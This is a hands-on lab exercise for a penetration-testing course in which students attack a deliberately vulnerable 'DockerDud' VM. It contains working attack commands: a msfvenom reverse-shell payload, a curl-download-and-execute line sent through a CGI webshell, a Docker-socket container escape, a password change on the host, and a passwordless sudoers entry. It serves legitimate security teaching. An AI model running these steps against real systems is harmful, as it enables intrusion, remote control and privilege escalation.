---
layout: exercise
exercise: 20
title: "Exercise: Docker Attack (using DockerDud)"
vm: dockerdud
tools: dirbuster metasploit-framework openssh-client
directories_to_sync: ssh-config
---

## Steps


1. Let's check for a port 80 web page. Visit this URL:

    <http://dockerdud>

2. Start up a fresh lxterminal by clicking the "sparrow" logo in the bottom-left corner of the screen, clicking run, typing `lxterminal` and hitting enter. 

3. Let's fire up `dirbuster` to look for more interesting content.

    ```shell
    dirbuster
    ```

4. In the `dirbuster` window, fill out the target URL with <http://dockerdud>

5. To complete the "File with list of dirs/files" box, choose the "Browse" box to its right, then navigate that window to `/usr/share/dirbuster/wordlists/` and choose `directory-list-lowercase-2.3-small.txt`.

6. Make sure that "Be recursive." is checked.

7. Click the "Use Blank Extension" checkbox.

8. Now click the "Start" button in the lower right corner of the `dirbuster` window.

9. Now click the "Results-List View" tab to see the results update in real time.

10. Stop the scan when it finds "garbage." The amount of time this takes depends on the number of requests per second you see. In one test, at 422 requests per second, this took 7 minutes. If you'd like, let this run but skip to the next step, stipulating that you found "garbage" in the results.

11. We found a simple CGI script that runs commands, clearly placed at the insistence of the Hackers movie villain, "The Plague". Check it out by surfing to:

    <http://dockerdud/cgi-bin/garbage>

12. In the "Command" window, enter `id` and hit the `Enter` key. You'll see what user this backdoor is running as.

13. Now, let's get a Meterpreter binary running via this backdoor.  Start up a terminal and create a fresh Meterpreter binary:

    ```shell
    
    msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp \
    LHOST=10.23.58.30 LPORT=4444 -e x86/shikata_ga_nai -o mrsbin -f elf
    ```

14. Now stage a web server in that terminal, hosting the `mrsbin` binary:

    ```shell
    python3 -m http.server 80
    ```

15. Next, start up a new terminal by hitting `Ctrl-shift-T`.

16. Let's start up Metasploit to receive the Meterpreter connection.  Start a Metasploit console session:

    ```shell
    msfconsole
    ```

17. In the Metasploit console, run these commands to start a listener that's specific to this Meterpreter binary:

    ```text
    use exploit/multi/handler
    set payload linux/x86/meterpreter/reverse_tcp
    set LHOST 10.23.58.30
    exploit -j
    ```

18. Now, switch back to your browser, where we'll be replacing our id command with one that will download, chmod and run the mrsbin Meterpreter binary.

19. Copy and paste this text into the "Command" form item, then click "Submit".

    ```text
    curl -O http://10.23.58.30/mrsbin; chmod 755 mrsbin; ./mrsbin
    ```

20. Notice that the page seems to keep loading forever. That's a good thing – it means that the garbage webshell hasn't finished executing `mrsbin`. If it ever does, we'll likely need to restart `mrsbin` through the webshell,.

21. Switch back to the terminal window to see that your Metasploit console shows a "Meterpreter session N opened" where N is a number, usually 1.  Press `Enter`.

22. Interact with the meterpreter by typing `sessions -i N`, where N is that session number from the previous step.  If `N = 1`, type:

    ```shell
    sessions -i 1
    ```

23. Now get a shell by typing:

    ```shell
    shell
    ```

24. Run a `mount` command, so we can see if anything interesting is mounted:

    ```shell
    mount
    ```

25. Note that the first line of output suggests that we're in a Docker container - it says that the `/` filesystem is mounted in via an overlay filesystem. Overlay file systems are almost only used in containers.

    **Note**: [Overlay filesystems](https://en.wikipedia.org/wiki/OverlayFS) differ from normal filesystem mounting, in that they involve layers that are "union"-mounted. Files in the same directory from two different layers are visible.  In normal mounting, one partition is mounted onto `/`, while the next partition is mounted onto a subdirectory like `/home`, blocking  anything in the first partition's `/home` from view.

26. Find the line that starts like this - it indicates that someone has mounted the Docker socket into the container:

    ```
    tmpfs on /run/docker.sock type tmpfs
    ```

27. If we had a docker binary to run, we could interact with the Docker daemon on this machine. Let's check if we do:

    ```shell
    docker ps
    ```

28. Notice that we were able to run docker commands! Most docker installs do not have an authorization plugin.  This means that if you're able to access the Docker engine at all, you can do everything. Let's see how dangerous that is.

29. Let's start up a privileged container, adding all Linux root capabilities to it. We'll want an image that's cached on this machine already, so we don't need to pull anything across the internet:

    ```shell
    docker images
    ```

30. OK - let's use the first container image: `dockersock`

31. Try (and fail) to create a privileged container, with all root capabilities, working from that image:

    ```shell
    docker run -it --privileged --cap-add ALL dockersock /bin/bash
    ```

32. You'll be told that you need a TTY. Let's get one, using a classic penetration tester trick:

    ```shell
    echo 'import pty; pty.spawn("/bin/bash")' >>shell.py
    python shell.py
    ```

33. Now let's try again to create the privileged container:

    ```shell
    docker run -it --privileged --cap-add ALL dockersock /bin/bash
    ```

34. Awesome! We've launched a new container and are now running commands in it.

35. Take a look at the `/dev` contents that privileged containers get access to:

    ```shell
    ls /dev
    ```

36. Let's take a look at the disk partitions on the host (`/dev/sda` on VMware, `/dev/vda` on KVM):

    ```shell
    fdisk -l /dev/vda
    ```

37. Note that this is a simple layout - there's a Linux (ext4) partition and a swap partition.

38. Mount the root partition (`/dev/sda1` on VMware, `/dev/vda1` on KVM) onto `/mnt` in this container:

    ```shell
    mount /dev/vda1 /mnt
    ```

39. Take a look at `/etc/passwd` on the host:

    ```shell
    cat /mnt/etc/passwd
    ```

40. Note that there's a user account called `theplague`. We'll change their password in a moment. First, let's simulate being in the host filesystem by `chroot`-ing ourself into `/mnt`:

    ```shell
    chroot /mnt /bin/bash
    ```

41. Change `theplague`'s password.  First, run a `passwd` command to start the password change process.

    ```shell
    passwd theplague
    ```

42. Set `theplague`'s password to `theplague`, just to keep things simple:

    ```
    theplague
    theplague
    ```

43. Now add `theplague` to the sudoers file as a user who doesn't need to type a password:

    ```shell
    echo "theplague ALL=(ALL) NOPASSWD:ALL" >>/etc/sudoers
    ```

44. Let's exit the `chroot`'ed shell:

    ```shell
    exit
    ```

45. Now unmount `/mnt`:

    ```shell
    umount /mnt
    ```

46. Ok - let's use the access we have on the host. Open a new terminal window or tab on your Kali system and run:

    ```shell
    ssh theplague@dockerdud
    ```

47. When asked for a password, enter `theplague`:

    ```
    theplague
    ```
    
48. Run `ls` and notice that there's a flag file waiting for you:

    ```shell
    ls
    ```

49. Start up another terminal window or tab and use `scp` to pull the flag file to your own system - you can enter `theplague` when asked for a password:

    ```shell
    scp theplague@dockerdud:FLAG.jpg ~/Desktop
    ```

50. Click the file manager icon - it looks like a folder.

51. Click the Desktop icon, then click the `FLAG.jpg` icon to view it.  Leave this file manager running, please.

52. Go back to your `ssh` session and escalate to `root`:

    ```shell
    sudo su -
    ```

53. You're now in `root`'s home directory, as `root`.  List the directory contents:

    ```shell
    ls
    ```

54. Let's move that `FLAG.gif` file into `theplague`'s home directory so we can pull it down with `scp`:

    ```shell
    mv FLAG.gif /home/theplague
    ```

55. Change the file's owner to `theplague`, so we can use `scp` to pull it down:

    ```shell
    chown theplague /home/theplague/FLAG.gif
    ```

56. Open another terminal window or just go to whichever one you used to `scp` the last flag. Transfer this flag to your Kali host:

    ```shell
    scp theplague@dockerdud:FLAG.gif ~/Desktop
    ```

57. Now switch back to the file manager and look at your final flag file: `FLAG.gif`

58. When you're done with this exercise, we'll discuss the defense.

59. Suspend the virtual machines:

    ```shell
    sudo /sync/bin/suspend-all-vms.sh 
    ```
